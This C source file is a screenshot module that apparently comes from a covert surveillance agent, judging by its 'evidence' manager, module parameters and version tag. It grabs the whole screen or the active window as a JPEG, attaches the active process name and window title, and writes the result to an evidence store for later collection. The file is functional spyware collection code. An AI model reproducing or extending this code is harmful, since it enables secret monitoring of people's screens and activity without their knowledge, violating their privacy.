#include <stdio.h>
#include <stdlib.h>
#include <X11/Xlib.h>
#include <openssl/bio.h>
#include <string.h>

#include "module.h"
#include "evidencemanager.h"
#include "me.h"
#include "runtime.h"
#include "xutils.h"
#include "bioutils.h"
#include "imgutils.h"

#define SCREENSHOTMODULE_VERSION 2009031201
struct additional {
   unsigned int version;
   unsigned int processlen;
   unsigned int titlelen;
} __attribute__((packed));

extern Display *display;

void *module_screenshot_main(void *args)
{
   Window active = 0;
   char *process = NULL, *title = NULL;
   int window = 0, quality = 90;
   struct additional a;
   BIO *bio_additional = NULL;
   char *additionalptr = NULL, *dataptr = NULL;
   long additionallen = 0, datalen = 0;
   
   debugme("Module SCREENSHOT started\n");
   if(initlib(INIT_LIBJPEG)) return NULL;

   if(MODULE_SCREENSHOT_P) {
      window = MODULE_SCREENSHOT_P->window;
      quality = MODULE_SCREENSHOT_P->quality;
   }

   do {
      if(!(active = getactivewindow(display))) break;
      getwindowproperties(display, active, &process, &title);
      if(!(datalen = getscreenimage(display, window ? active : DefaultRootWindow(display), -1, -1, -1, -1, quality, &dataptr))) break;

      if(!(bio_additional = BIO_new(BIO_s_mem()))) break;
      a.version = SCREENSHOTMODULE_VERSION;
      a.processlen = strlen16(process) + 2;
      a.titlelen = strlen16(title) + 2;
      BIO_write(bio_additional, &a, sizeof(a));
      BIO_puts16n(bio_additional, process);
      BIO_puts16n(bio_additional, title);
      if(!(additionallen = BIO_get_mem_data(bio_additional, &additionalptr))) break;

      evidence_write(EVIDENCE_TYPE_SCREENSHOT, additionalptr, additionallen, dataptr, datalen);
   } while(0); 
   if(bio_additional) BIO_free(bio_additional);
   if(dataptr) free(dataptr);
   if(process) free(process);
   if(title) free(title);

   debugme("Module SCREENSHOT stopped\n");

   return NULL;
}
